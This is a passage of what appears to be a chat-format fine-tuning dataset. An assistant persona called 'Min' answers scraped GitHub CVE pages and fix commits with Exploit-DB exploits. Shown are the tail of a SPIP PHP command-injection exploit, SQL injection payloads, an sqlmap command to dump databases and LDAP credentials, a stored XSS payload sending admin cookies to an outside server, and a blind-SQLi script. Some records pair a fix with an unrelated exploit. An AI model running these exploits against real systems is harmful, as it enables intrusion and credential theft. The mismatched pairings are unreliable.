payload\n    }\n    r = requests.post('%s/spip.php?page=spip_pass' % url, data=data)\n    if options.verbose:\n        print(\"[+] Execute this payload : %s\" % payload)\n    return 0\n\nif __name__ == '__main__':\n    options = parseArgs()\n\n    requests.packages.urllib3.disable_warnings()\n    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'\n    try:\n        requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'\n    except AttributeError:\n        pass\n\n    csrf = get_anticsrf(url=options.url)\n    send_payload(url=options.url, payload=\"s:%s:\\\"<?php system('%s'); ?>\\\";\" % (20 + len(options.command), options.command))\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/zPrototype/CVE-2023-29809\n\nGitHub - zPrototype/CVE-2023-29809\n\nSkip to content\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        zPrototype\n \n/\n\nCVE-2023-29809\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    1\n \n          Star\n 1\n  \n1\n          star\n \n\n1\n          fork\n \n\nBranches\n \n\nTags\n \n\nActivity\n \n\n \n          Star\n\n  \n\n \n\nNotifications\n You must be signed in to change notification settings\n\nCode\n\nIssues\n0\nPull requests\n0\nActions\n\nProjects\n0\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Actions\n          Projects\n          Security\n          Insights\n\n \n\nzPrototype/CVE-2023-29809\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n \n\n    mainBranchesTagsGo to fileCodeFolders and filesNameNameLast commit messageLast commit dateLatest commit History2 CommitsREADME.mdREADME.md  Screenshot 2023-04-30 at 22.23.51.pngScreenshot 2023-04-30 at 22.23.51.png  Screenshot 2023-04-30 at 22.24.35.pngScreenshot 2023-04-30 at 22.24.35.png  View all filesRepository files navigationREADMEExploit Title: Unauthenticated SQL injection\n\nGoogle Dork:\nDate: 27.04.2023\nExploit Author: Lucas Noki (0xPrototype)\nVendor Homepage: https://github.com/vogtmh\nSoftware Link: https://github.com/vogtmh/cmaps\nVersion: 8.0\nTested on: Mac, Windows, Linux\nCVE : CVE-2023-29809\n\nDescription:\nThe vulnerability found is an SQL injection. The bookmap parameter is vulnerable. When visiting the page: http://192.168.0.56/rest/booking/index.php?mode=list&bookmap=test we get the normal JSON response. However if a single quote gets appended to the value of the bookmap parameter we get an error message:\n<b>Warning</b>: mysqli_num_rows() expects parameter 1 to be mysqli_result, bool given in <b>/var/www/html/rest/booking/index.php</b> on line <b>152</b><br />\nNow if two single quotes get appended we get the normal response without an error. This confirms the opportunity for sql injection. To really prove the SQL injection we append the following payload:\n'-(select*from(select+sleep(2)+from+dual)a)--+\n\nThe page will sleep for two seconds. This confirms the SQL injection.\nSteps to reproduce:\nSend the following payload to test the vulnerability: '-(select*from(select+sleep(2)+from+dual)a)--+\nIf the site slept for two seconds run the following sqlmap command to dump the whole database including the ldap credentials.\npython3 sqlmap.py -u \"http://<IP>/rest/booking/index.php?mode=list&bookmap=test*\" --random-agent --level 5 --risk 3 --batch --timeout=10 --drop-set-cookie -o --dump\nSpecial thanks goes out to iCaotix who greatly helped me in getting the environment setup as well as debugging my payload.\nRequest to the server:\n\nResponse from the server:\nLook at the response time.\n\n   \nAbout\n\n        No description, website, or topics provided.\n      \nResources\n\n        Readme\n \n\nActivity\n \nStars\n\n1\n      star\n \nWatchers\n\n1\n      watching\n \nForks\n\n1\n      fork\n \n          Report repository\n \n\n    Releases\n\nNo releases published\n    Packages\n      0\n        No packages published \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsSQL injection vulnerability found in Maximilian Vogt companymaps (cmaps) v.8.0 allows a remote attacker to execute arbitrary code via a crafted script in the request.\n\nexploit\n/php/webapps/51422.txt\n# Exploit Title: Cmaps v8.0 - SQL injection\n\n- Date: 27.04.2023\n- Exploit Author: Lucas Noki (0xPrototype)\n- Vendor Homepage: https://github.com/vogtmh\n- Software Link: https://github.com/vogtmh/cmaps\n- Version: 8.0\n- Tested on: Mac, Windows, Linux\n- CVE : CVE-2023-29809\n\n*Description:*\n\nThe vulnerability found is an SQL injection. The `bookmap` parameter is vulnerable. When visiting the page: http://192.168.0.56/rest/booking/index.php?mode=list&bookmap=test we get the normal JSON response. However if a single quote gets appended to the value of the `bookmap` parameter we get an error message:\n```html\n<b>Warning</b>: mysqli_num_rows() expects parameter 1 to be mysqli_result, bool given in <b>/var/www/html/rest/booking/index.php</b> on line <b>152</b><br />\n```\n\nNow if two single quotes get appended we get the normal response without an error. This confirms the opportunity for sql injection. To really prove the SQL injection we append the following payload:\n```\n'-(select*from(select+sleep(2)+from+dual)a)--+\n```\n\nThe page will sleep for two seconds. This confirms the SQL injection.\n\n*Steps to reproduce:*\n\n1. Send the following payload to test the vulnerability: ```'-(select*from(select+sleep(2)+from+dual)a)--+```\n\n2. If the site slept for two seconds run the following sqlmap command to dump the whole database including the ldap credentials.\n   ```shell\n   python3 sqlmap.py -u \"http://<IP>/rest/booking/index.php?mode=list&bookmap=test*\" --random-agent --level 5 --risk 3 --batch --timeout=10 --drop-set-cookie -o --dump\n   ```\n\nSpecial thanks goes out to iCaotix who greatly helped me in getting the environment setup as well as debugging my payload.\n\n\n\n## Request to the server:\n\n<img src=\"Screenshot 2023-04-30 at 22.23.51.png\" alt=\"Screenshot 2023-04-30 at 22.23.51\" style=\"zoom:50%;\" />\n\n## Response from the server:\n\nLook at the response time.\n<img src=\"Screenshot 2023-04-30 at 22.24.35.png\" alt=\"Screenshot 2023-04-30 at 22.24.35\" style=\"zoom:50%;\" />\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/zPrototype/CVE-2023-29983\n\nGitHub - zPrototype/CVE-2023-29983\n\nSkip to content\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        zPrototype\n \n/\n\nCVE-2023-29983\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    1\n \n          Star\n 0\n  \n0\n          stars\n \n\n1\n          fork\n \n\nBranches\n \n\nTags\n \n\nActivity\n \n\n \n          Star\n\n  \n\n \n\nNotifications\n You must be signed in to change notification settings\n\nCode\n\nIssues\n0\nPull requests\n0\nActions\n\nProjects\n0\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Actions\n          Projects\n          Security\n          Insights\n\n \n\nzPrototype/CVE-2023-29983\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n \n\n    mainBranchesTagsGo to fileCodeFolders and filesNameNameLast commit messageLast commit dateLatest commit History7 CommitsREADME.mdREADME.md  image-20230430005643809.pngimage-20230430005643809.png  image-20230430010017153.pngimage-20230430010017153.png  View all filesRepository files navigationREADMEExploit Title: Stored Cross Site Scripting\n\nGoogle Dork:\nDate: 27.04.2023\nExploit Author: Lucas Noki (0xPrototype)\nVendor Homepage: https://github.com/vogtmh\nSoftware Link: https://github.com/vogtmh/cmaps\nVersion: 8.0\nTested on: Mac, Windows, Linux\nCVE : CVE-2023-29983\n\nDescription:\nThe vulnerability found is Stored Cross Site Scripting. When the rest/update/?token= endpoint is hit with a request where the token parameter contains a malicious payload we have the possibility to sXSS. This happens because the input isn't sanitized. It gets written as is into the database. Then if an admin visits the auditlog tab, the request is taken out of the database and echoed directly into the page. This triggers the XSS everytime someone visits the auditlog or refreshes it.\nSteps to reproduce:\n\nClone the repository and install the application\nSend a maliciously crafted payload via the \"token\" parameter to the following endpoint: /rest/update/?token=\nThe payload used is: <script>new+Image().src=`http://YOUR_COLLABORATOR_SERVER/?c=${document.cookie}`</script>\nSimply visiting the complete URL: http://IP/rest/update/?token=PAYLOAD is enough.\nLogin into the admin panel and go to the auditlog under: /admin/index.php?tab=auditlog\nCheck your collaborator server. You should have a request where the admins cookie is the value of the c parameter\n\nIn a real world case you would need to wait for the admin to log into the application and open the auditlog tab.\nSpecial thanks goes out to iCaotix who greatly helped me in getting the environment setup as well as debugging my payload.\nRequest to the server:\n\nResponse from the collaborator after admin opens the audit log:\n\n   \nAbout\n\n        No description, website, or topics provided.\n      \nResources\n\n        Readme\n \n\nActivity\n \nStars\n\n0\n      stars\n \nWatchers\n\n1\n      watching\n \nForks\n\n1\n      fork\n \n          Report repository\n \n\n    Releases\n\nNo releases published\n    Packages\n      0\n        No packages published \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsCross Site Scripting vulnerability found in Maximilian Vogt cmaps v.8.0 allows a remote attacker to execute arbitrary code via the auditlog tab in the admin panel.\n\nexploit\n/php/webapps/51417.txt\n# Exploit Title: Companymaps V8.0 - Stored Cross Site Scripting (XSS)\n# Date: 27.04.2023\n# Exploit Author: Lucas Noki (0xPrototype)\n# Vendor Homepage: https://github.com/vogtmh\n# Software Link: https://github.com/vogtmh/cmaps\n# Version: 8.0\n# Tested on: Mac, Windows, Linux\n# CVE : CVE-2023-29983\n\n*Steps to reproduce:*\n1. Clone the repository and install the application\n2. Send a maliciously crafted payload via the \"token\" parameter to the following endpoint: /rest/update/?token=\n3. The payload used is: <script>new+Image().src=`http://YOUR_COLLABORATOR_SERVER/?c=${document.cookie}`</script>\n4. Simply visiting the complete URL: http://IP/rest/update/?token=PAYLOAD is enough.\n5. Login into the admin panel and go to the auditlog under: /admin/index.php?tab=auditlog\n6. Check your collaborator server. You should have a request where the admins cookie is the value of the c parameter\n\nIn a real world case you would need to wait for the admin to log into the application and open the auditlog tab.\n\nSpecial thanks goes out to iCaotix who greatly helped me in getting the environment setup as well as debugging my payload.\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/opencart/opencart/commit/0a8dd91e385f70e42795380009fd644224c1bc97\nUpdate log.php · opencart/opencart@0a8dd91 · GitHub\n\nSkip to content\n\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        opencart\n \n/\n\nopencart\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    4.8k\n \n          Star\n 7.3k\n  \nCode\n\nIssues\n22\nPull requests\n9\nDiscussions\n\nActions\n\nProjects\n1\nWiki\n\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Discussions\n          Actions\n          Projects\n          Wiki\n          Security\n          Insights\n\n \n\nCommit\n\nPermalink\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n          Update log.php\n        \n\nBrowse files\nBrowse the repository at this point in the history\nLoading branch information\n\n \ndanielkerr\n    \n  committed\n  Sep 15, 2023\n\n        1 parent\n          \n          f984689\n\ncommit 0a8dd91\n\n      Showing\n      1 changed file\n      with\n      2 additions\n      and\n      2 deletions.\n    \n \nWhitespace\n \nIgnore whitespace\n\n \nSplit\n \nUnified\n \n \n        There are no files selected for viewing\n\n \n\n            4 changes: 2 additions & 2 deletions\n          \n4 \n\nupload/admin/controller/tool/log.php\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -104,7 +104,7 @@ public function download(): void {\n\n $this->load->language('tool/log');\n\n if (isset($this->request->get['filename'])) {\n\n $filename = (string)basename($this->request->get['filename']);\n\n $filename = (string)basename(html_entity_decode($this->request->get['filename'], ENT_QUOTES, 'UTF-8'));\n\n\t\t} else {\n\n $filename = '';\n\n\t\t}\nExpand Down\n\nExpand Up\n\n@@ -140,7 +140,7 @@ public function clear(): void {\n\n $this->load->language('tool/log');\n\n if (isset($this->request->get['filename'])) {\n\n $filename = (string)$this->request->get['filename'];\n\n $filename = (string)basename(html_entity_decode($this->request->get['filename'], ENT_QUOTES, 'UTF-8'));\n\n\t\t} else {\n\n $filename = '';\n\n\t\t}\nExpand Down\n\nToggle all file notes\nToggle all file annotations\n\n    0 comments\n    on commit 0a8dd91\n\n  \n\n    Please\n  sign in to comment.\n\n \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsPath Traversal in OpenCart versions 4.0.0.0 to 4.0.2.2 allows an authenticated user with access/modify privilege on the Log component to empty out arbitrary files on the server\n\nexploit\n/php/webapps/51272.py\n# Exploit Title: Art Gallery Management System Project in PHP v 1.0 - SQL injection\n# Date: 31-01-2023\n# Exploit Author: Yogesh Verma\n# Vendor Homepage: https://y0gesh-verma.github.io/\n# Software Link: https://phpgurukul.com/art-gallery-management-system-using-php-and-mysql/, https://phpgurukul.com/projects/Art-Gallery-MS-PHP.zip\n# Version: 1.0\n# Tested on: Windows/Linux\n# CVE : CVE-2023-23156\n\n\n\n#!/usr/bin/python\nimport sys\nimport requests\n\ntmp = requests.Session()\ndb_name = \"\"\ndatabase = \"\"\nif len(sys.argv) == 2:\n    url = sys.argv[1]\n    for i in range(1, 7):\n        for j in range(32, 126):\n            sql_payload = f\"'UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,(select*from(select (ascii(substr(database(),{i},1))={j}))a),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL'\"\n            data = {'pid': '-1' + sql_payload}\n            r = tmp.get(url, params=data)\n            if \"Dimension : 1\" in r.text:\n                db_name += chr(j)\n    database += db_name\n    if len(db_name)>1:\n        print('\\n'+\"Fetching current database :\")\n        print(database)\n        print('\\n'+\"vulnerable to CVE-2023-23156\")\n    else:\n        print(\"Not vulnerable to CVE-2023-23156\")\nelse:\n    print(\"Error: Please provide the URL as an argument.\")\n    print(\"Example: script.py https://example.com/single-product.php\")\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/pimcore/pimcore/commit/e3562bfe249c557d15474c9a0acd5e06628521fe\nfixed xss in quantity values (#14937) · pimcore/pimcore@e3562bf · GitHub\n\nSkip to content\n\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        pimcore\n \n/\n\npimcore\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    1.4k\n \n          Star\n 3.2k\n  \nCode\n\nIssues\n379\nPull requests\n57\nDiscussions\n\nActions\n\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Discussions\n          Actions\n          Security\n          Insights\n\n \n\nCommit\n\nPermalink\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n          fixed xss in quantity values (#14937)\n        \n\nBrowse files\nBrowse the repository at this point in the history\nLoading branch information\n\n \nCorepex\n    \n  committed\n  Apr 17, 2023\n        1 parent\n          \n          7821f65\n\ncommit e3562bf\n \n Show file tree\n \n Hide file tree\n\n      Showing\n      2 changed files\n      with\n      17 additions\n      and\n      11 deletions.\n    \n \nWhitespace\n \nIgnore whitespace\n\n \nSplit\n \nUnified\n \n\n \n        bundles/AdminBundle/Resources/public/js/pimcore/object/quantityvalue\n      \n\nbundles/AdminBundle/Resources/public/js/pimcore/object/quantityvalue/unitsettings.js\n\n        unitsettings.js\n      \n        models/DataObject/QuantityValue\n      \n\nmodels/DataObject/QuantityValue/Unit.php\n\n        Unit.php\n      \n\n \n        There are no files selected for viewing\n\n \n\n            18 changes: 12 additions & 6 deletions\n          \n18 \n\nbundles/AdminBundle/Resources/public/js/pimcore/object/quantityvalue/unitsettings.js\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -77,7 +77,6 @@ pimcore.object.quantityValue.unitsettings = Class.create({\n\n type: 'json',\n\n rootProperty: 'data'\n\n }\n\n },\n\n // disable client pagination, default: 25\n\n pageSize: 0,\nExpand Down\n\nExpand Up\n\n@@ -106,9 +105,9 @@ pimcore.object.quantityValue.unitsettings = Class.create({\n\n var typesColumns = [\n\n {flex: 1, dataIndex: 'id', text: t(\"id\"), filter: 'string'},\n\n {flex: 1, dataIndex: 'abbreviation', text: t(\"abbreviation\"), editor: new Ext.form.TextField({}), filter: 'string'},\n\n {flex: 2, dataIndex: 'longname', text: t(\"longname\"), editor: new Ext.form.TextField({}), filter: 'string'},\n\n {flex: 1, dataIndex: 'group', text: t(\"group\"), editor: new Ext.form.TextField({}), filter: 'string', hidden: true},\n\n {flex: 1, dataIndex: 'abbreviation', text: t(\"abbreviation\"), editor: new Ext.form.TextField({listeners: {change: this.sanitizeTextColumn}}), filter: 'string'},\n\n {flex: 2, dataIndex: 'longname', text: t(\"longname\"), editor: new Ext.form.TextField({listeners: {change: this.sanitizeTextColumn}}), filter: 'string'},\n\n {flex: 1, dataIndex: 'group', text: t(\"group\"), editor: new Ext.form.TextField({listeners: {change: this.sanitizeTextColumn}}), filter: 'string', hidden: true},\n\n {flex: 1, dataIndex: 'baseunit', text: t(\"baseunit\"), editor: baseUnitEditor, renderer: function(value){\n\n if(!value) {\n\n return '('+t('empty')+')';\nExpand All\n\n@@ -122,8 +121,8 @@ pimcore.object.quantityValue.unitsettings = Class.create({\n\n }},\n\n {flex: 1, dataIndex: 'factor', text: t(\"conversionFactor\"), editor: new Ext.form.NumberField({decimalPrecision: 10}), filter: 'numeric'},\n\n {flex: 1, dataIndex: 'conversionOffset', text: t(\"conversionOffset\"), editor: new Ext.form.NumberField({decimalPrecision: 10}), filter: 'numeric'},\n\n {flex: 1, dataIndex: 'reference', text: t(\"reference\"), editor: new Ext.form.TextField({}), hidden: true, filter: 'string'},\n\n {flex: 1, dataIndex: 'converter', text: t(\"converter_service\"), editor: new Ext.form.TextField({}), filter: 'string'}\n\n {flex: 1, dataIndex: 'reference', text: t(\"reference\"), editor: new Ext.form.TextField({listeners: {change: this.sanitizeTextColumn}}), hidden: true, filter: 'string'},\n\n {flex: 1, dataIndex: 'converter', text: t(\"converter_service\"), editor: new Ext.form.TextField({listeners: {change: this.sanitizeTextColumn}}), filter: 'string'}\n\n ];\n\n typesColumns.push({\nExpand Down\n\nExpand Up\n\n@@ -280,5 +279,12 @@ pimcore.object.quantityValue.unitsettings = Class.create({\n\n }\n\n var rec = selections.getAt(0);\n\n this.grid.store.remove(rec);\n\n },\n\n sanitizeTextColumn: function (textField) {\n\n if(textField.getValue()){\n\n const sanitizedValue = textField.getValue().replace(/[<>\"'!?/\\\\&%$();]/gi, '');\n\n textField.setValue(sanitizedValue);\n\n }\n\n }\n\n});\n            10 changes: 5 additions & 5 deletions\n          \n10 \n\nmodels/DataObject/QuantityValue/Unit.php\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -209,7 +209,7 @@ public function __toString()\n\n     */\n\n public function setAbbreviation($abbreviation)\n\n    {\n\n $this->abbreviation = $abbreviation;\n\n $this->abbreviation = htmlspecialchars($abbreviation);\n\n return $this;\n\n    }\nExpand Down\n\nExpand Up\n\n@@ -276,7 +276,7 @@ public function getFactor()\n\n     */\n\n public function setGroup($group)\n\n    {\n\n $this->group = $group;\n\n $this->group = htmlspecialchars($group);\n\n return $this;\n\n    }\nExpand Down\n\nExpand Up\n\n@@ -316,7 +316,7 @@ public function getId()\n\n     */\n\n public function setLongname($longname)\n\n    {\n\n $this->longname = $longname;\n\n $this->longname = htmlspecialchars($longname);\n\n return $this;\n\n    }\nExpand Down\n\nExpand Up\n\n@@ -344,7 +344,7 @@ public function getReference()\n\n     */\n\n public function setReference($reference)\n\n    {\n\n $this->reference = $reference;\n\n $this->reference = htmlspecialchars($reference);\n\n return $this;\n\n    }\nExpand Down\n\nExpand Up\n\n@@ -384,7 +384,7 @@ public function getConverter()\n\n     */\n\n public function setConverter($converter)\n\n    {\n\n $this->converter = (string)$converter;\n\n $this->converter = htmlspecialchars((string)$converter);\n\n return $this;\n\n    }\nExpand Down\n\nToggle all file notes\nToggle all file annotations\n\n    0 comments\n    on commit e3562bf\n\n  \n\n    Please\n  sign in to comment.\n\n \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsCross-site Scripting (XSS) - Generic in GitHub repository pimcore/pimcore prior to 10.5.21.\n\nexploit\n/multiple/webapps/51264.txt\n# Exploit Title: Provide Server v.14.4 XSS - CSRF & Remote Code Execution (RCE)\n# Date: 2023-02-10\n# Exploit Author: Andreas Finstad\n# Version: < 14.4.1.29\n# Tested on: Windows Server 2022\n# CVE : 